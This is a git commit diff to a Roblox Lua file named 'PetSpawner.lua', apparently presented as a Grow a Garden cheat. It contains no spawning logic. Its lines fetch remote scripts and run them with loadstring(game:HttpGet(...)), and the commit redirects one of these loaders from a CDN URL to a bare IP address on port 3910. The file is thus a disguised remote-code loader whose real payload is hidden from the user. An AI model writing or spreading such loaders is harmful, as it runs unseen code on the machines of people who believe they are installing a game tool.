b03facf93993b73280f71ea17d2ad1cb630a1d98
ren <ikazuryzel@gmail.com>
2025-08-31 11:43:14 +0800

    Update PetSpawner.lua

--- PetSpawner.lua
+++ PetSpawner.lua
@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ranzurg/GrowaGarden/refs/heads/main/kyzel.lua"))()
 task.wait(1)
 ID="2eaab011-87c0-40e3-a83c-705a72f78877";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
